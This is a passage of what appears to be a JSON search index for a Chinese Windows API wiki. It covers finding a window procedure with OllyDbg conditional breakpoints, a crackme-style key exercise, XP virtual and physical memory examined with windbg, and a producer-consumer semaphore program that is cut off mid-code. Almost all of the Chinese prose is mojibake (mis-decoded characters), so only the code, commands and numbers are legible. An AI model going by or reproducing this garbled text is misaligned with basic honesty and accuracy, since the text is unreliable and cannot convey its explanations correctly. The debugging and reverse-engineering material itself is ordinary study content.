wndClass.lpfnWndProcæŒ‡æ˜äº†å›è°ƒå‡½æ•°çš„åœ°å€ã€‚ä¹‹å‰å†™è¿‡ç¬¬ä¸€ä¸ªçª—å£ç¨‹åºï¼Œæˆ‘ä»¬å°±å¯ä»¥çŸ¥é“ï¼Œåˆ›å»ºå®ŒwndClasså¯¹è±¡åç»™æˆå‘˜èµ‹å€¼åï¼Œè¦ç”¨RegisterClassæ³¨å†Œçª—å£ç±»ã€‚RegisterClassçš„å‚æ•°æ˜¯ä¸€ä¸ªwndClasså¯¹è±¡çš„æŒ‡é’ˆã€‚äºæ˜¯æˆ‘ä»¬æ‰¾åˆ°RegisterClasså‡½æ•°ï¼Œçœ‹å®ƒçš„å‚æ•°çš„å€¼ï¼ˆwndClasså¯¹è±¡çš„åœ°å€ï¼‰ åœ¨å¯„å­˜å™¨çª—å£å³é”®EDXçš„å€¼é€‰æ‹©â€œå †æ ˆçª—å£ä¸­è·Ÿéšâ€ï¼Œçœ‹å †æ ˆçª—å£ã€‚æ­¤æ—¶è¿™10ä¸ªæˆå‘˜çš„å€¼éƒ½æ˜¯0ã€‚å¾€åçœ‹æ±‡ç¼–æŒ‡ä»¤ï¼Œæ˜ç™½äº†ï¼ŒReleaseä¸‹å®ƒå…ˆå‹å‚æ•°ï¼Œç„¶åå†ç»™å †æ ˆä¸­è¿™äº›æˆå‘˜èµ‹å€¼ã€‚ tipsï¼šç›®å‰æˆ‘ä»¬å…³æ³¨å †æ ˆä¸­è¿™10ä¸ªå‚æ•°çš„å˜åŒ–ï¼Œå¦‚æœä¸æƒ³è®©åç»­æŒ‡ä»¤çš„æ‰§è¡Œå½±å“åˆ°å †æ ˆçª—å£çš„å˜åŒ–ï¼Œå¯ä»¥åœ¨å †æ ˆçª—å£å³é”®â€œé”å®šå †æ ˆï¼ˆlock stackï¼‰â€ å †æ ˆä¸­ä»ä¸Šåˆ°ä¸‹çš„é¡ºåºå°±æ˜¯wndClassç»“æ„ä½“å‚æ•°çš„é¡ºåºï¼Œç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯å›è°ƒå‡½æ•°åœ°å€ã€‚åœ¨å †æ ˆçª—å£å³é”®ï¼Œåœ¨åæ±‡ç¼–çª—å£è·Ÿéšï¼Œå°±èƒ½è·³è¿‡å»äº†ã€‚ 123456789101112typedef struct tagWNDCLASSA &#123; UINT style; WNDPROC lpfnWndProc; int cbClsExtra; int cbWndExtra; HINSTANCE hInstance; HICON hIcon; HCURSOR hCursor; HBRUSH hbrBackground; LPCSTR lpszMenuName; LPCSTR lpszClassName;&#125; WNDCLASSA, *PWNDCLASSA, *NPWNDCLASSA, *LPWNDCLASSA; å…·ä½“æ¶ˆæ¯å¤„ç†çš„å®šä½ æ‰¾åˆ°å›è°ƒå‡½æ•°åœ¨å›è°ƒå‡½æ•°å¼€å¤´ä¸‹æ–­åï¼Œä¸èƒ½æ”¾è¿‡å»è·‘ã€‚å› ä¸ºæ¶ˆæ¯åœ¨ä¸æ–­äº§ç”Ÿï¼Œåœ¨å‡½æ•°å¼€å¤´æ–­ä¸‹ï¼Œä¼šä¸€ç›´è¢«æ–­ä¸‹ï¼Œç„¶ååªèƒ½æ”¾è¿‡å»ï¼Œç„¶ååˆæ–­ä¸‹ï¼Œå•¥ä¹Ÿåšä¸äº†ã€‚ ç‚¹å‡»Breakçª—å£ï¼Œå¯¹è¯¥æ–­ç‚¹å³é”®â€œç¼–è¾‘æ¡ä»¶â€æ·»åŠ æ¡ä»¶ï¼Œåªå¯¹è‡ªå·±æ„Ÿå…´è¶£çš„æ¶ˆæ¯åŠ æ–­ç‚¹ï¼Œæ¯”å¦‚å½“é¼ æ ‡å·¦é”®ç‚¹ä¸‹æ—¶çš„æ¶ˆæ¯[esp+8]==WM_LBUTTONDOWNï¼ˆä¸å†™å®ï¼Œå†™æ•°å€¼çš„è¯è¦å†™åå…­è¿›åˆ¶ï¼‰ åˆšè¿›å…¥åˆ°å›è°ƒå‡½æ•°å¼€å¤´ï¼Œ[esp]æ˜¯è¿”å›åœ°å€ï¼Œ[esp+4]æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°hwndï¼Œ[esp+8]æ˜¯ç¬¬äºŒä¸ªå‚æ•°uMsg ï¼ˆä¸‹å›¾æ˜¯æ·»åŠ æ¡ä»¶æ–­ç‚¹åæˆªå›¾çš„ï¼Œä¸ºäº†è¯´æ˜å †æ ˆé‡Œçš„å€¼åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼‰ å¦‚æ­¤ï¼Œè®©ç¨‹åºè·‘èµ·æ¥ï¼Œåªæœ‰è§¦å‘é¼ æ ‡å·¦é”®æ¶ˆæ¯WM_LBUTTONDOWNæ—¶ODæ‰ä¼šæ–­ä¸‹ã€‚æ–­ä¸‹åå°±æ˜¯ç»§ç»­åˆ†æåšäº†ä»€ä¹ˆäº‹ï¼Œè°ƒç”¨äº†ä»€ä¹ˆcallä¹‹ç±»çš„ ï¼ˆä¸‹å›¾æ˜¯ç¨‹åºè·‘èµ·æ¥åï¼Œåœ¨çª—å£ä¸Šç‚¹å‡»é¼ æ ‡å·¦é”®ï¼Œè§¦å‘æ–­ç‚¹ï¼ŒODæ–­ä¸‹çš„æˆªå›¾ï¼‰ ç»ƒä¹  æ‰¾å‡ºæŒ‰ä¸‹é”®ç›˜å“ª3ä¸ªé”®ä¸ä¼šå¼¹å‡ºError Codeçš„çª—ï¼ˆReverseTraining_1.exeï¼‰ è¿‡ç¨‹æ‰¾åˆ°å›è°ƒå‡½æ•°åä¸‹æ¡ä»¶æ–­ç‚¹[esp+8]==WM_KEYDOWNï¼Œè·‘èµ·æ¥ï¼Œå¯¹çª—å£å‡è®¾æŒ‰ä¸‹aé”®æŸ¥è™šæ‹Ÿé”®ç çš„è¡¨æ ¼Virtual-Key Codes (Winuser.h) - Win32 apps | Microsoft Learnç­”æ¡ˆå°±æ˜¯aï¼Œfï¼Œæ•°å­—é”®ç›˜7ï¼ˆä¸Šå›¾ODçš„æ³¨é‡Šæ˜¯æŒ‰ASCIIç æ³¨é‡Šçš„ï¼Œæ‰€ä»¥å†™æˆäº†â€œgâ€ï¼‰a-0x41-f65f-0x46-70æ•°å­—é”®ç›˜7-0x67-af"},{"title":"è™šæ‹Ÿå†…å­˜ä¸ç‰©ç†å†…å­˜","path":"/wiki/Windows_API/è™šæ‹Ÿå†…å­˜ä¸ç‰©ç†å†…å­˜.html","content":"å‰è¨€ å­¦ä¹ å†…å­˜ç®¡ç†ç›¸å…³çš„apiå‰éœ€è¦äº†è§£æœ¬èŠ‚çš„çŸ¥è¯†å†…å®¹ã€‚ è™šæ‹Ÿå†…å­˜ä¸ç‰©ç†å†…å­˜çš„å…³ç³» æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„4GBç©ºé—´ï¼Œä¸Šé¢çš„å†…å­˜åœ°å€å«çº¿æ€§åœ°å€ã€‚è¿™å—å†…å­˜æ˜¯å‡çš„è™šæ‹Ÿå†…å­˜ï¼Œä¸æ˜¯çœŸå®å­˜åœ¨çš„å†…å­˜ã€‚åªæœ‰è¿™ä¸ªè™šæ‹Ÿå†…å­˜çœŸæ­£ä½¿ç”¨æ—¶æ“ä½œç³»ç»Ÿæ‰ä¼šå¯¹è¿™ä¸ªè™šæ‹Ÿåœ°å€æŒ‚ä¸Šç‰©ç†é¡µï¼Œæœªä½¿ç”¨çš„è™šæ‹Ÿå†…å­˜è‚¯å®šå°±æ²¡æŒ‚ç‰©ç†é¡µã€‚ ç‰©ç†å†…å­˜æ˜¯æ“ä½œç³»ç»ŸæŠ½è±¡å‡ºæ¥çš„å†…å­˜ï¼Œå®ƒç¦»çœŸæ­£çš„å†…å­˜æ¡ä¹‹é—´è¿˜æœ‰ä¸€å±‚ç”µè·¯è½¬æ¢ï¼Œä½†è¿™ä¸ªè¿‡äºåº•å±‚ã€‚æˆ‘ä»¬äº†è§£åˆ°ç‰©ç†å†…å­˜è¿™ä¸€å±‚å³å¯ã€‚ MMUè´Ÿè´£å°†è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºç‰©ç†å†…å­˜åœ°å€ã€‚ Aè¿›ç¨‹åœ¨003A000åœ°å€å­˜äº†ä¸€ä¸ªå€¼10ï¼ŒBè¿›ç¨‹åœ¨003A000åœ°å€å­˜äº†ä¸€ä¸ªå€¼20ã€‚è¿›ç¨‹Aå’Œè¿›ç¨‹Bçš„CR3ä¸åŒï¼Œæ‰€ä»¥è¿›ç¨‹Açš„çº¿æ€§åœ°å€003A000å’Œè¿›ç¨‹Bçš„çº¿æ€§åœ°å€003A000æœ€åè½¬æˆçš„ç‰©ç†å†…å­˜åœ°å€æ˜¯ä¸åŒçš„ã€‚ è™šæ‹Ÿå†…å­˜åœ°å€åˆ’åˆ† æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„4GBè™šæ‹Ÿå†…å­˜ç©ºé—´ã€‚ä½2Gä¸ºç”¨æˆ·ç©ºé—´ï¼Œè¿›ç¨‹å¯ä»¥ä½¿ç”¨çš„ç©ºé—´ï¼›é«˜2Gæ˜¯å†…æ ¸ç©ºé—´ï¼Œæ‰€æœ‰è¿›ç¨‹å…±äº«çš„ç©ºé—´ã€‚åœ¨ä½2Gçš„ç”¨æˆ·ç©ºé—´ä¸­ï¼Œè¿˜æœ‰å‰64KBçš„ç©ºæŒ‡é’ˆèµ‹å€¼åŒºå’Œå64KBçš„ç”¨æˆ·ç¦å…¥åŒºä¸èƒ½ä½¿ç”¨ï¼ˆæ²¡æŒ‚ç‰©ç†é¡µï¼‰ã€‚æ‰€ä»¥ä¸€ä¸ªè¿›ç¨‹èƒ½ç”¨çš„è™šæ‹Ÿå†…å­˜ç©ºé—´åªæœ‰0x00010000-0x7FFEFFFFè¿™å—ç©ºé—´ã€‚è¿™æ˜¯èƒ½ä½¿ç”¨çš„éƒ¨åˆ†ï¼Œä½†åªæœ‰çœŸæ­£ä½¿ç”¨äº†æ‰ä¼šæŒ‚ç‰©ç†é¡µã€‚ åœ°å€ï¼ˆx86 32ä½windowsï¼‰ åˆ†åŒº 0x00000000-0x0000FFFF ç©ºæŒ‡é’ˆèµ‹å€¼åŒº 0x00010000-0x7FFEFFFF ç”¨æˆ·æ¨¡å¼åŒº 0x7FFF0000-0x7FFFFFFF 64KBç¦å…¥åŒº 0x80000000-0xFFFFFFFF å†…æ ¸ å®éªŒï¼šæŸ¥çœ‹ä¸€ä¸ªè¿›ç¨‹ç”¨æˆ·æ¨¡å¼åŒºä¸­çº¿æ€§åœ°å€çš„ä½¿ç”¨æƒ…å†µ ç”¨windbgå¯¹xpç³»ç»ŸåŒæœºè°ƒè¯•ï¼Œåœ¨xpç³»ç»Ÿä¸­æ‰“å¼€ä¸€ä¸ªnotepadï¼Œwindbgä¸‹æ–­ åˆ—å‡ºç³»ç»Ÿä¸­æ‰€æœ‰è¿›ç¨‹ä¿¡æ¯1!process 0 0 123PROCESS 860ba438 SessionId: 0 Cid: 05bc Peb: 7ffd7000 ParentCid: 0738 DirBase: 0d5801c0 ObjectTable: e209d300 HandleCount: 44. Image: notepad.exe æ˜¾ç¤ºå†…å­˜åœ°å€860ba438å¤„_EPROCESSç»“æ„ä½“çš„å†…å®¹1dt _EPROCESS 860ba438 VADæ ‘æ˜¯æ“ä½œç³»ç»Ÿç”¨æ¥è¿½è¸ªè¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´çš„ä¸€ç§ç»“æ„ æ˜¾ç¤ºåœ°å€0x862edf08å¤„VADèŠ‚ç‚¹çš„ä¿¡æ¯1!vad 0x862edf08 ç‰©ç†å†…å­˜ä»¥é¡µ4KBä¸ºå•ä½ï¼Œstartå’Œendçš„å•ä½æ˜¯é¡µï¼Œæ¯”å¦‚ç¬¬ä¸€è¡Œ 12VAD level start end commit860c4858 ( 3) 10 10 1 Private READWRITE è¡¨ç¤ºçš„å°±æ˜¯0x10-0x10è¿™ä¸€ä¸ª4KBçš„é¡µï¼Œçº¿æ€§åœ°å€æ˜¯0x10000-0x1000ï¼ˆä¹˜ä¸Šé¡µçš„å•ä½4KBï¼Œ1000hæˆ–4096åè¿›åˆ¶ï¼‰ çº¿æ€§åœ°å€0x00001000-0x00001000è¢«å ç”¨ï¼› çº¿æ€§åœ°å€0x00002000-0x00002000è¢«å ç”¨ï¼› â€¦ï¼› çº¿æ€§åœ°å€0x00100000-0x00101000è¢«å ç”¨ï¼Œç”¨äºå­˜å‚¨è®°äº‹æœ¬ç¨‹åºçš„ä»£ç æˆ–æ•°æ®ã€‚ ä¸­é—´ç©ºæŒ¡çš„çº¿æ€§åœ°å€å°±æ˜¯æ²¡ä½¿ç”¨çš„çº¿æ€§åœ°å€ã€‚ è§£è¯»è¾“å‡ºçš„VADèŠ‚ç‚¹ä¿¡æ¯VADï¼šè¿™æ˜¯VADèŠ‚ç‚¹çš„å†…å­˜åœ°å€ã€‚Levelï¼šVADæ ‘çš„å±‚çº§æ·±åº¦ï¼Œè¡¨ç¤ºè¯¥èŠ‚ç‚¹åœ¨æ ‘ä¸­çš„ä½ç½®ã€‚Start å’Œ Endï¼šè¿™ä¸¤åˆ—æ˜¾ç¤ºäº†ç”±è¯¥VADèŠ‚ç‚¹ç®¡ç†çš„è™šæ‹Ÿå†…å­˜åŒºåŸŸçš„èµ·å§‹å’Œç»“æŸåœ°å€ã€‚Commitï¼šè¿™è¡¨ç¤ºå·²æäº¤çš„é¡µé¢æ•°ã€‚å¯¹äºPrivateç±»å‹çš„åŒºåŸŸï¼Œè¿™æ˜¯å®é™…åˆ†é…ç»™è¯¥åŒºåŸŸçš„ç‰©ç†å†…å­˜é¡µé¢æ•°ã€‚å¯¹äºMappedç±»å‹çš„åŒºåŸŸï¼Œè¯¥å€¼é€šå¸¸ä¸ºé›¶ï¼Œå› ä¸ºå®ƒä»¬æ˜ å°„åˆ°æ–‡ä»¶ï¼Œè€Œä¸æ˜¯ç‰©ç†å†…å­˜ã€‚ç±»å‹ï¼šVADå¯ä»¥æ˜¯ä»¥ä¸‹å‡ ç§ç±»å‹ä¹‹ä¸€ï¼šPrivateï¼šç§æœ‰å†…å­˜åŒºåŸŸï¼Œé€šå¸¸ç”¨äºå­˜å‚¨è¿›ç¨‹ç‰¹æœ‰çš„æ•°æ®ã€‚Mappedï¼šæ˜ å°„å†…å­˜åŒºåŸŸï¼Œé€šå¸¸å…³è”åˆ°æŸä¸ªæ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œæ˜ å°„åˆ°å¯æ‰§è¡Œæ–‡ä»¶çš„åŒºåŸŸä¼šä»¥â€œMapped Exeâ€è¡¨ç¤ºã€‚ä¿æŠ¤ï¼šæ˜¾ç¤ºå†…å­˜åŒºåŸŸçš„è®¿é—®æƒé™ï¼Œå¦‚ READWRITE è¡¨ç¤ºå¯è¯»å†™çš„å†…å­˜åŒºåŸŸã€‚ç‰¹åˆ«æè¿°ï¼šå¯¹äºæ˜ å°„å†…å­˜ï¼Œè¿™ä¸€åˆ—å¯èƒ½åŒ…å«äº†æ˜ å°„æºçš„æ–‡ä»¶è·¯å¾„ï¼Œä¾‹å¦‚ \\WINDOWS\\system32 otepad.exeã€‚å¯¹äºç§æœ‰å†…å­˜ï¼Œè¿™ä¸€åˆ—é€šå¸¸ä¸ºç©ºã€‚ä¾‹å¦‚ï¼Œåœ°å€ 1000 åˆ° 1012 çš„åŒºåŸŸè¢«æ˜ å°„ä¸º notepad.exeï¼Œè¡¨ç¤ºè¿™éƒ¨åˆ†å†…å­˜åŒºåŸŸç”¨äºå­˜å‚¨è®°äº‹æœ¬ç¨‹åºçš„ä»£ç æˆ–æ•°æ®ã€‚ ç‰©ç†å†…å­˜ å¯ä¾›ä½¿ç”¨çš„ç‰©ç†å†…å­˜ Intelæ¶æ„å¤„ç†å™¨ä»¥4KBä¸ºæœ€å°å•ä½ï¼ˆé¡µï¼ŒPageï¼‰æ¥ç®¡ç†ç‰©ç†é¡µã€‚ä¸€å°ç”µè„‘ä¸Šå¯ä¾›ä½¿ç”¨çš„ç‰©ç†å†…å­˜çš„å¤§å°ä¸º ç‰©ç†å†…å­˜+è™šæ‹Ÿå†…å­˜ï¼ˆç¡¬ç›˜ï¼‰ç‰©ç†å†…å­˜+è™šæ‹Ÿå†…å­˜ï¼ˆç¡¬ç›˜ï¼‰ ç‰©ç†å†…å­˜+è™šæ‹Ÿå†…å­˜ï¼ˆç¡¬ç›˜ï¼‰ ç‰©ç†å†…å­˜ è¿™é‡Œçš„ç‰©ç†å†…å­˜æ˜¯æŒ‡æ’çš„å†…å­˜æ¡çš„å¤§å°ã€‚åœ¨VMä¸Šå°±æ˜¯è™šæ‹Ÿæœºé…ç½®çš„å†…å­˜å¤§å° åœ¨ä»»åŠ¡ç®¡ç†å™¨ä¸­å¯ä»¥çœ‹åˆ°ç³»ç»Ÿå¯ç”¨çš„ç‰©ç†é¡µæ€»æ•°æ˜¯1047984Kï¼Œè¿™ä¸ªæ•°æ˜¯æ¥è¿‘äº1GBÃ·1024B=1048576Kçš„ 230Ã·210=2202^{30}Ã·2^{10}=2^{20}230Ã·210=220ï¼Œ1048576K 1047984K Ã· 4ï¼Œè½¬ä¸ºç‰©ç†é¡µæ•°é‡ï¼Œä¸º261996ä¸ªç‰©ç†é¡µï¼Œåå…­è¿›åˆ¶æ˜¯3FF6Ch åŒå‡»è°ƒè¯•åä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯ä»¥çœ‹è¯¥ç³»ç»Ÿä¸­çš„æ€»ç‰©ç†å†…å­˜é¡µé¢æ•° ä»¥åŒå­—å½¢å¼æ˜¾ç¤ºMmNumberOfPhysicalPageså­˜å‚¨çš„å€¼1dd MmNumberOfPhysicalPages MmNumberOfPhysicalPages*4=ç‰©ç†å†…å­˜ 123456789kd&gt; dd MmNumberOfPhysicalPages805599c8 0003ff6c 00000040 00000000 7fff0000805599d8 80000000 7ffeffff 00000000 00000000805599e8 00000000 00000000 00000000 00000000805599f8 00000000 00000000 0000000c 0000000080559a08 00000000 00000000 00000000 0000000080559a18 00000000 00000000 00000000 0000000080559a28 00000000 00000000 00000000 0000000080559a38 00000000 00000000 00000000 00000000 è™šæ‹Ÿå†…å­˜ï¼ˆç¡¬ç›˜ï¼‰ å°†å†…å­˜ä¸­æš‚æ—¶ç”¨ä¸åˆ°çš„æ•°æ®æ”¾åˆ°ç¡¬ç›˜ä¸­ï¼Œéœ€è¦æ—¶å†ä»ç¡¬ç›˜ä¸­æ¢å›å†…å­˜ã€‚ è¿™ä¸ªè™šæ‹Ÿå†…å­˜ï¼ˆç¡¬ç›˜ï¼‰çš„å¤§å°å¯è®¾ç½® å¯ä»¥åœ¨Cç›˜ä¸‹æŸ¥çœ‹ï¼ˆéœ€è¦æ˜¾ç¤ºéšè—æ–‡ä»¶ï¼‰pagefile.sysè¿™ä¸ªæ–‡ä»¶ï¼Œå®ƒåˆšå¥½æ˜¯768MBè¿™ä¸ªå¤§å°ï¼Œè¿™ä¸ªæ–‡ä»¶å°±æ˜¯ç”¨æ¥åšè™šæ‹Ÿå†…å­˜çš„ï¼š èƒ½å¤Ÿè¯†åˆ«çš„ç‰©ç†å†…å­˜ ä¸Šé¢æ˜¯å¯ä¾›ä½¿ç”¨çš„ç‰©ç†å†…å­˜ï¼Œä½†å¹¶ä¸æ˜¯è¯´ä¸»æœºä¸Šæ’çš„å†…å­˜æ¡è¶Šå¤šï¼Œæ“ä½œç³»ç»Ÿéƒ½èƒ½è¯†åˆ«ã€‚ 32ä½æ“ä½œç³»ç»Ÿæœ€å¤šå¯ä»¥è¯†åˆ«ç‰©ç†å†…å­˜ä¸º64Gï¼ˆ2-9-9-12åˆ†é¡µæ¨¡å¼ä¸‹ï¼‰ï¼Œä½†æ˜¯æ“ä½œç³»ç»Ÿä¼šè¿›è¡Œé™åˆ¶ï¼Œä¾‹å¦‚XPç³»ç»Ÿåªèƒ½è¯†åˆ«4Gçš„ç‰©ç†å†…å­˜ï¼ˆè€Œå†…æ ¸ä¸€æ ·çš„æœåŠ¡å™¨ç‰ˆWindows Server 2003å¯ä»¥è¯†åˆ«4Gä»¥ä¸Šï¼‰ã€‚ å¯ä»¥é€šè¿‡HOOKç³»ç»Ÿå‡½æ•°æ¥çªç ´XPæ“ä½œç³»ç»Ÿçš„4GBé™åˆ¶ï¼Œè®©å†…å­˜è¯†åˆ«èŒƒå›´è¶…è¿‡4GB æ— æ—¶æ— åˆ»çš„ç¼ºé¡µå¼‚å¸¸ å‡è®¾è¿›ç¨‹Aåœ¨ä½¿ç”¨çº¿æ€§åœ°å€003A000ï¼Œæ“ä½œç³»ç»Ÿä¼šä¸ºè¯¥åœ°å€åˆ†é…ç›¸åº”çš„ç‰©ç†å†…å­˜åœ°å€ï¼ˆæŒ‚ç‰©ç†é¡µï¼‰ï¼Œå½“è¿›ç¨‹Aä¸ä½¿ç”¨æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šå°†è¿™ä¸ªç‰©ç†é¡µä¸Šçš„æ•°æ®å­˜åˆ°pagefile.sysæ–‡ä»¶ä¸­ï¼Œç„¶åå°†è¿™ä¸ªç‰©ç†é¡µåˆ†é…ç»™å…¶ä»–éœ€è¦ä½¿ç”¨çš„è¿›ç¨‹ã€‚å½“è¿›ç¨‹Aå†æ¬¡éœ€è¦è®¿é—®çº¿æ€§åœ°å€003A000æ—¶ï¼Œå‘ç”Ÿç¼ºé¡µå¼‚å¸¸ï¼Œç”±æ“ä½œç³»ç»Ÿä¸ºè¯¥çº¿æ€§åœ°å€å†æ¬¡æŒ‚ä¸Šç‰©ç†é¡µï¼Œå¹¶å°†æ•°æ®ä»pagefile.sysæ–‡ä»¶å†™åˆ°æ–°çš„ç‰©ç†é¡µä¸­ï¼Œè¿›ç¨‹Aåˆèƒ½è®¿é—®åˆ°å®ƒçš„æ•°æ®äº†ã€‚è¿™äº›å¯¹åº”ç”¨å¼€å‘è€…ï¼Œç¨‹åºç”¨æˆ·æ¥è¯´æ˜¯é€æ˜çš„ã€‚ å°ç»“ å¼„æ¸…ä»¥ä¸‹é—®é¢˜å³å¯ï¼š ä»€ä¹ˆæ˜¯è™šæ‹Ÿå†…å­˜ï¼Œä»€ä¹ˆæ˜¯ç‰©ç†å†… å­˜ è™šæ‹Ÿå†…å­˜æœ‰å¤šå°‘ï¼Œå“ªä¸€å—ç”¨äº†ï¼Œå“ªä¸€å—æ²¡ç”¨ ç‰©ç†å†…å­˜æœ‰å¤šå°‘ï¼Œç‰©ç†å†…å­˜æ˜¯æ€ä¹ˆç®¡ç†çš„ ç‰©ç†å†…å­˜èƒ½è¯†åˆ«å¤šå°‘å’Œèƒ½ä½¿ç”¨å¤šå°‘"},{"title":"çº¿ç¨‹äº’æ–¥ä¸çº¿ç¨‹åŒæ­¥é—®é¢˜","path":"/wiki/Windows_API/çº¿ç¨‹äº’æ–¥ä¸çº¿ç¨‹åŒæ­¥é—®é¢˜.html","content":"æ¦‚å¿µ çº¿ç¨‹äº’æ–¥ï¼šå¤šä¸ªçº¿ç¨‹éœ€è¦è®¿é—®ï¼ˆå†™ï¼Œéƒ½æ˜¯è¯»çš„è¯ä¸éœ€è¦ï¼‰åŒä¸€ä¸ªä¸´ç•Œèµ„æº çº¿ç¨‹åŒæ­¥ï¼šå¤šä¸ªçº¿ç¨‹è®¿é—®åŒä¸€ä¸´ç•Œèµ„æºæœ‰å…ˆåé¡ºåºè¦æ±‚ï¼ŒåŒæ­¥=äº’æ–¥+æœ‰åº å¤æ‚çº¿ç¨‹äº’æ–¥å’ŒåŒæ­¥é—®é¢˜ï¼Œæ—¢è¦äº’æ–¥æ§åˆ¶ï¼Œåˆè¦åŒæ­¥æ§åˆ¶ ç»ƒä¹ é¢˜ ç•Œé¢å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œç¨‹åºæ‰§è¡Œæµç¨‹æ˜¯è¿™æ ·çš„ï¼š ç”¨æˆ·åœ¨ç”¨æˆ·è¾“å…¥æ¡†ä¸­è¾“å…¥ä¸€äº›å­—ç¬¦ ç‚¹å‡»å¼€å§‹æŒ‰é’®åï¼Œæœ‰1ä¸ªç”Ÿäº§è€…çº¿ç¨‹ä»ç”¨æˆ·è¾“å…¥æ¡†ä¸­ä»å·¦åˆ°å³è¯»å•ä¸ªå­—ç¬¦å‡ºæ¥æ”¾åˆ°ç¼“å†²åŒº1æˆ–ç¼“å†²åŒº2 ç¼“å†²åŒº1å’Œç¼“å†²åŒº2ç”¨äºç»™ç”Ÿäº§è€…æ”¾å•ä¸ªå­—ç¬¦ï¼Œç¼“å†²åŒºåªæœ‰ä¸¤ç§æƒ…å†µï¼Œè¦ä¹ˆä¸ºâ€œç©ºâ€ï¼Œè¦ä¹ˆæ”¾äº†ä¸€ä¸ªå­—ç¬¦ æœ‰3ä¸ªæ¶ˆè´¹è€…çº¿ç¨‹ï¼Œä¼šä»ç¼“å†²åŒº1æˆ–ç¼“å†²åŒº2å–å­—ç¬¦è¿½åŠ åˆ°è‡ªå·±åé¢çš„ç¼–è¾‘æ¡†ä¸­ï¼ˆå¦‚æœç¼“å†²åŒº1å’Œç¼“å†²åŒº2æœ‰æ•°æ®ï¼‰ ä¸€ä¸ªå…¸å‹çš„æ“ä½œä¾‹å­æ˜¯ï¼š ç”¨æˆ·è¾“å…¥ABCDE12ï¼Œç‚¹å‡»å¼€å§‹æŒ‰é’® ç”Ÿäº§è€…è¯»åˆ°å­—ç¬¦Aï¼Œé€‰äº†ä¸€ä¸ªå¯ç”¨çš„ç¼“å†²åŒºï¼Œæ¯”å¦‚ç¼“å†²åŒº1ï¼Œæ”¾å…¥å­—ç¬¦åï¼Œå‘ä¿¡å·ç»™æ¶ˆè´¹è€… æ­¤æ—¶3ä¸ªæ¶ˆè´¹è€…ä¸­ä»»ä¸€ä¸€ä¸ªè¿›åˆ°ä¸´ç•ŒåŒºï¼Œè¯»åˆ°ç¼“å†²åŒº1è¿™ä¸ªå­—ç¬¦ï¼Œç„¶åå°†å­—ç¬¦Aè¿½åŠ åˆ°è‡ªå·±çš„ç¼–è¾‘æ¡†ä¸­ï¼Œéšåä¼šå°†ç¼“å†²åŒº1ç½®â€œç©ºâ€ï¼Œé€šçŸ¥ç”Ÿäº§è€…ç¼“å†²åŒºä¸ºç©ºå¯ä»¥ç»§ç»­æ¥ç”Ÿäº§ã€‚ è¿‡ç¨‹ 1ä¸ªç”Ÿäº§è€…ï¼Œ2ä¸ªç¼“å†²åŒºï¼Œ4ä¸ªæ¶ˆè´¹è€… è¦ç”¨ä¿¡å·é‡ï¼Œè¡¨ç¤ºå¯ç”¨èµ„æºæ•°ï¼Œå°†ä¿¡å·é‡ç›´æ¥ç†è§£ä¸ºé€šçŸ¥ï¼Œä¿¡å·é‡æ¯”äº‹ä»¶å¤šäº†æ•°é‡ï¼Œä»…æ­¤è€Œå·²ã€‚ å½“ç”Ÿäº§è€…ç”Ÿäº§åï¼Œé€šçŸ¥æ¶ˆè´¹è€…è¿›è¡Œæ¶ˆè´¹ï¼ˆg_hSemaphoreFull+1ï¼‰ å½“æ¶ˆè´¹è€…æ¶ˆè´¹åï¼Œé€šçŸ¥ç”Ÿäº§è€…è¿›è¡Œç”Ÿäº§ï¼ˆg_hSemaphoreEmpty+1ï¼‰ è¿›å…¥ä¸´ç•ŒåŒºæ—¶ï¼Œæ¶ˆè´¹è€…ä¹‹é—´çš„äº’æ–¥å…³ç³» è¿™é‡Œæ˜¯å¤šä¸ªBufferï¼Œå¦‚æœæƒ³ç”Ÿäº§è€…å¾€ç¼“å†²åŒº1ç”Ÿäº§ï¼Œæ¶ˆè´¹è€…åœ¨ç¼“å†²åŒº2æ¶ˆè´¹ã€‚ å¯¹äºæ¯ä¸ªç¼“å†²åŒºï¼Œéœ€è¦ï¼š2ä¸ªä¿¡å·é‡+1æŠŠäº’æ–¥é”ã€‚ è¿™é‡Œç›´æ¥ç”¨1æŠŠé”å°†ä¸¤ä¸ªç¼“å†²åŒºé”ä¸€å—äº† 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176#include &lt;Windows.h&gt;#include &quot;resource.h&quot;BOOL CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);DWORD WINAPI WorkerThreadProc(LPVOID lpParameter);DWORD WINAPI ProducerThreadProc(LPVOID lpParameter);DWORD WINAPI ConsumerThreadProc(LPVOID lpParameter);HWND g_hEditInput = NULL; //ç”¨æˆ·è¾“å…¥ç¼–è¾‘æ¡†const BYTE BUFFER_COUNT = 2; //ç¼“å†²åŒºç¼–è¾‘æ¡†HWND g_hEditBuffer[BUFFER_COUNT];BOOL g_BufferIsEmpty[2]; //TRUEï¼šä¸ºç©º FALSEï¼šæ»¡const BYTE CONSUMER_COUNT = 3; //æ¶ˆè´¹è€…ç¼–è¾‘æ¡†HWND g_hEditConsumer[CONSUMER_COUNT];HANDLE g_hSemaphoreEmpty = NULL;HANDLE g_hSemaphoreFull = NULL;CRITICAL_SECTION g_cs;int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)&#123; DialogBox(hInstance, MAKEINTRESOURCE(IDD_DIALOG_MAIN), NULL, DialogProc ); return 0;&#125;BOOL CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)&#123; switch (uMsg) &#123; case 